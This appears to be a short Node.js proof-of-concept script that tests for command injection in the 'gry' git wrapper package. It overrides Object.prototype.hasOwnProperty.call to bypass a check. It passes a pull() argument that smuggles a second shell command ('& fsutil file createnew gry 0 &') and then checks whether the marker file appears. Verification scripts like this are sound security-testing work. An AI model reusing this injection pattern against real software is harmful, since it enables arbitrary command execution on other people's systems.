Object.prototype.hasOwnProperty.call = () => true;
const Repo = require('gry');
const fs = require('fs');
const path = './gry';
try {
    if (fs.existsSync(path)) {
        fs.unlinkSync(path);
    }
} catch (err) {
    console.error(err);
}
file_exist = fs.existsSync(path);
console.log('{ ' + file_exist + ', ' + false + ' }');
let myRepo = new Repo('.');
myRepo.pull('test & fsutil file createnew gry 0 &', function () {
    file_exist = fs.existsSync(path);
    console.log('{ ' + file_exist + ', ' + true + ' }');
    fs.unlink(path, function (err) {
    });
});